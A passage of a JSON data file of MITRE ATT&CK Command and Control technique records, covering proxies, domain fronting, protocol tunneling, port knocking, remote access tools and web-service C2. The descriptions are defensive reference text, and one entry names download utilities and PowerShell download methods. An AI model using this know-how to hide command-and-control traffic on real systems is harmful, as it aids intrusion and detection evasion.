    "last_updated": "2025-07-02T13:23:24.100707"
  },
  {
    "technique_id": "T1568.003",
    "name": "DNS Calculation",
    "description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.[1]One implementation ofDNS Calculationis to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.[1][2][3]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Dynamic Resolution",
    "parent_technique_id": "T1568",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:27.422701"
  },
  {
    "technique_id": "T1573",
    "name": "Encrypted Channel",
    "description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:30.767617",
    "subtechniques": [
      {
        "id": "T1573.001",
        "name": "Symmetric Cryptography"
      },
      {
        "id": "T1573.002",
        "name": "Asymmetric Cryptography"
      }
    ]
  },
  {
    "technique_id": "T1573.001",
    "name": "Symmetric Cryptography",
    "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Encrypted Channel",
    "parent_technique_id": "T1573",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:34.205999"
  },
  {
    "technique_id": "T1573.002",
    "name": "Asymmetric Cryptography",
    "description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiverâ€™s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified asAsymmetric Cryptography.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Encrypted Channel",
    "parent_technique_id": "T1573",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:37.595106"
  },
  {
    "technique_id": "T1008",
    "name": "Fallback Channels",
    "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:40.951736",
    "subtechniques": []
  },
  {
    "technique_id": "T1665",
    "name": "Hide Infrastructure",
    "description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,[1]masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,[2][3][4]and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.C2 networks may include the use ofProxyor VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.[5][6]Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.[7][8]Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e.,Virtualization/Sandbox Evasion).[1][7]Hiding C2 infrastructure may also be supported byResource Developmentactivities such asAcquire InfrastructureandCompromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.[9][10]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:44.276680",
    "subtechniques": []
  },
  {
    "technique_id": "T1105",
    "name": "Ingress Tool Transfer",
    "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such asftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e.Lateral Tool Transfer).On Windows, adversaries may use various utilities to download tools, such ascopy,finger,certutil, andPowerShellcommands such asIEX(New-Object Net.WebClient).downloadString()andInvoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such ascurl,scp,sftp,tftp,rsync,finger, andwget.[1]A number of these tools, such aswget,curl, andscp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., viacertutil -hashfile).[2]Adversaries may also abuse installers and package managers, such asyumorwinget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windowssearch-msprotocol handler, to deliver malicious files to victims through remote file searches invoked byUser Execution(typically after interacting withPhishinglures).[3]Files can also be transferred using variousWeb Services as well as native or otherwise present tools on the victim system.[4]In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.[5]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:48.117307",
    "subtechniques": []
  },
  {
    "technique_id": "T1104",
    "name": "Multi-Stage Channels",
    "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks orFallback Channelsin case the original first-stage communication path is discovered and blocked.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:51.475504",
    "subtechniques": []
  },
  {
    "technique_id": "T1095",
    "name": "Non-Application Layer Protocol",
    "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.[1]Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example.[2]Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.[3]However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi hostâ€™s backdoor, regardless of network segmentation or firewall rules in place.[4]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:54.996012",
    "subtechniques": []
  },
  {
    "technique_id": "T1571",
    "name": "Non-Standard Port",
    "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088[1]or port 587[2]as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.[3]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:58.354418",
    "subtechniques": []
  },
  {
    "technique_id": "T1572",
    "name": "Protocol Tunneling",
    "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.[1][2]Protocol Tunnelingmay also be abused by adversaries duringDynamic Resolution. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.[3]Adversaries may also leverageProtocol Tunnelingin conjunction withProxyand/orProtocol or Service Impersonationto further conceal C2 communications and infrastructure.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:01.715231",
    "subtechniques": []
  },
  {
    "technique_id": "T1090",
    "name": "Proxy",
    "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, includingHTRAN, ZXProxy, and ZXPortMap.[1]Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:05.116691",
    "subtechniques": [
      {
        "id": "T1090.001",
        "name": "Internal Proxy"
      },
      {
        "id": "T1090.002",
        "name": "External Proxy"
      },
      {
        "id": "T1090.003",
        "name": "Multi-hop Proxy"
      },
      {
        "id": "T1090.004",
        "name": "Domain Fronting"
      }
    ]
  },
  {
    "technique_id": "T1090.001",
    "name": "Internal Proxy",
    "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, includingHTRAN, ZXProxy, and ZXPortMap.[1]Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Proxy",
    "parent_technique_id": "T1090",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:08.469332"
  },
  {
    "technique_id": "T1090.002",
    "name": "External Proxy",
    "description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, includingHTRAN, ZXProxy, and ZXPortMap.[1]Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Proxy",
    "parent_technique_id": "T1090",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:11.870221"
  },
  {
    "technique_id": "T1090.003",
    "name": "Multi-hop Proxy",
    "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.For example, adversaries may construct or use onion routing networks â€“ such as the publicly availableTornetwork â€“ to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.[1]Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.[2]In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e.,Network Devices). By leveragingPatch System Imageon routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon theNetwork Boundary Bridgingmethod allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organizationâ€™s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.[3]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Proxy",
    "parent_technique_id": "T1090",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:15.231441"
  },
  {
    "technique_id": "T1090.004",
    "name": "Domain Fronting",
    "description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.[1]Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Proxy",
    "parent_technique_id": "T1090",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:18.609847"
  },
  {
    "technique_id": "T1219",
    "name": "Remote Access Tools",
    "description": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.[1][2][3]Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates aWindows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chromeâ€™s Remote Desktop).[4][5]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:21.984095",
    "subtechniques": [
      {
        "id": "T1219.001",
        "name": "IDE Tunneling"
      },
      {
        "id": "T1219.002",
        "name": "Remote Desktop Software"
      },
      {
        "id": "T1219.003",
        "name": "Remote Access Hardware"
      }
    ]
  },
  {
    "technique_id": "T1219.001",
    "name": "IDE Tunneling",
    "description": "Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g.,code tunnel) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.[1][2][3]Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.IDE tunneling tools may be built-in or installed asIDE Extensions.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Access Tools",
    "parent_technique_id": "T1219",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:25.362835"
  },
  {
    "technique_id": "T1219.002",
    "name": "Remote Desktop Software",
    "description": "An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such asVNC,Team Viewer,AnyDesk,ScreenConnect,LogMein,AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.[1][2][3]Remote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chromeâ€™s Remote Desktop.[4][5]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Access Tools",
    "parent_technique_id": "T1219",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:28.719745"
  },
  {
    "technique_id": "T1219.003",
    "name": "Remote Access Hardware",
    "description": "An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.Remote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s).[1][2]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Access Tools",
    "parent_technique_id": "T1219",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:32.061482"
  },
  {
    "technique_id": "T1205",
    "name": "Traffic Signaling",
    "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enableNetwork Device Authenticationfor standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]To enable this traffic signaling on embedded devices, adversaries must first achieve and leveragePatch System Imagedue to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:35.423560",
    "subtechniques": [
      {
        "id": "T1205.001",
        "name": "Port Knocking"
      },
      {
        "id": "T1205.002",
        "name": "Socket Filters"
      }
    ]
  },
  {
    "technique_id": "T1205.001",
    "name": "Port Knocking",
    "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Traffic Signaling",
    "parent_technique_id": "T1205",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:38.781839"
  },
  {
    "technique_id": "T1205.002",
    "name": "Socket Filters",
    "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as thelibpcaplibrary to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.[1]Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction withProtocol Tunneling.[2][3]Filters can be installed on any Unix-like platform withlibpcapinstalled or on Windows hosts usingWinpcap.  Adversaries may use eitherlibpcapwithpcap_setfilteror the standard library functionsetsockoptwithSO_ATTACH_FILTERoptions. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Traffic Signaling",
    "parent_technique_id": "T1205",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:42.149981"
  },
  {
    "technique_id": "T1102",
    "name": "Web Service",
    "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.[1]Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:45.567425",
    "subtechniques": [
      {
        "id": "T1102.001",
        "name": "Dead Drop Resolver"
      },
      {
        "id": "T1102.002",
        "name": "Bidirectional Communication"
      },
      {
        "id": "T1102.003",
        "name": "One-Way Communication"
      }
    ]
  },
  {
    "technique_id": "T1102.001",
    "name": "Dead Drop Resolver",
    "description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Web Service",
    "parent_technique_id": "T1102",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:48.932586"
  },
  {
    "technique_id": "T1102.002",
    "name": "Bidirectional Communication",
    "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Web Service",
    "parent_technique_id": "T1102",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:24:52.330078"
  },
  {
    "technique_id": "T1102.003",
    "name": "One-Way Communication",
    "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
